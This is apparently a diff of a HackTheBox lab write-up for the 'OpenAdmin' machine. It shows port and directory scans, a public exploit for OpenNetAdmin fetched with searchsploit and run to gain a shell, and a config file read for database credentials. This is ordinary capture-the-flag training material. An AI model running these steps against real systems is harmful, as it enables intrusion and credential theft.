@@ -1,20 +1,20 @@
-----------------------------------------------------
-# Author -> Shubham Rannpise
-----------------------------------------------------
 # OpenAdmin
-# 29/3/2023
+
+
+| Key | Value |
+|-----|-------|
+| Platform | HackTheBox |
+| OS | Linux |
+| Difficulty | Easy |
+
 10.10.10.171
 
-----------------------------------------------------
-# nmap
-----------------------------------------------------
+## Recon
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
 
-----------------------------------------------------
 gobuster
-----------------------------------------------------
 /music                (Status: 301) [Size: 312] [--> http://10.10.10.171/music/]
 /artwork              (Status: 301) [Size: 314] [--> http://10.10.10.171/artwork/]
 /sierra               (Status: 301) [Size: 313] [--> http://10.10.10.171/sierra/]
@@ -22,17 +22,13 @@ dirbuster
 http://10.10.10.171/ona/
 
 
-----------------------------------------------------
-# foothold
-----------------------------------------------------
+## Exploitation
 └─$ searchsploit 18.1.1 
 └─$ searchsploit -m php/webapps/47691.sh
 └─$ ./47691.sh http://10.10.10.171/ona/
 we got shell
 
-----------------------------------------------------
 # lateral movements
-----------------------------------------------------
 www-data@openadmin:/var/www/ona/local/config$ cat database_settings.inc.php
         'db_login' => 'ona_sys',
         'db_passwd' => 'n1nj4W4rri0R!',
